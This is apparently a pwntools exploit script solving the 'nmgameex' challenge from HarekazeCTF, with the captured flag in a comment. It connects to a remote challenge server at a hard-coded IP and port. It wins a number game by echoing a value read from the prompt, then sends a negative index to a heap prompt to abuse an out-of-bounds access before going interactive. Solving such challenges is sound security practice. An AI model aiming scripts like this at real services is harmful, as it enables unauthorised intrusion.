#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random
import subprocess

# exploit
def Pwn():
 global io

 io.sendlineafter(']: ','3')
 while True:
  io.recvuntil('? ')
  send_number = chr(io.recvuntil(']: ')[3])
  print(send_number)

  io.sendline(send_number)
  result = io.recvline()
  if b'Won' in result:
   break
  elif b'lost' in result:
   continue
 i = 0
 for i in xrange(199):
  io.sendlineafter('heap [','-4')
  io.recvuntil(']: ')
  data = io.recvuntil(']: ')
  if b'heap' in data:
   break
  io.sendline('2')

# congratulations! Here is the flag: HarekazeCTF{1o0ks_lik3_w3_mad3_A_m1st4ke_ag41n}
if __name__=='__main__':
# io = process('./nmgameex')
 io = remote('20.48.84.13', 20003)

 Pwn()
 io.interactive()
